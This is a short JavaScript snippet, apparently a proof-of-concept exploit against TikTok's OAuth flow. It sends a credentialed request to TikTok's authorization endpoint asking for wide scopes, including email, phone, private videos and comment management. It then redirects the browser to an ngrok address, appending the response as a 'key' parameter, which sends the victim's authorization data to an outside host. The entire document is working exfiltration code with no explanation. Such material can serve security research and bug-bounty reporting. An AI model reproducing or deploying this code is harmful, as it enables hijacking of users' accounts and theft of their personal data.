var xhr = new XMLHttpRequest();

xhr.onload = reqListener; 
xhr.open("POST", "https://www.tiktok.com/passport/open/web/auth/v2/?client_key=awn32gkr1d27lv49&scope=user.info.basic%2Clive.list%2Ccomment.list%2Cuser.info.stats%2Cvideo.list.private_ads.no_watermark%2Cuser.info.email%2Cuser.info.phone%2Ccomment.list.manage%2Cuser.info.username%2Cvideo.list%2Cvideo.list.no_watermark%2Cuser.info.showcase%2Cvideo.list.manage&aid=1459&state=%7B%22csrfState%22%3A%22e86i2a%22%2C%22login_only%22%3A0%2C%22page_name%22%3A%22sign_up%22%2C%22redirect_url%22%3A%22https%3A%2F%2Fseller-id.tiktok.com%2Fsettle%2Fverification%3Fregion_check%3D1%22%2C%22url_params%22%3A%22%22%7D&redirect_uri=https%3A%2F%2Fseller-id.tiktok.com%2Faccount%2Foauth%2Ftt%2Fcallback&source=web&response_type=code");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send();

function reqListener() {
    location='//b564-202-162-37-174.ngrok-free.app/?key='+this.responseText; 
};
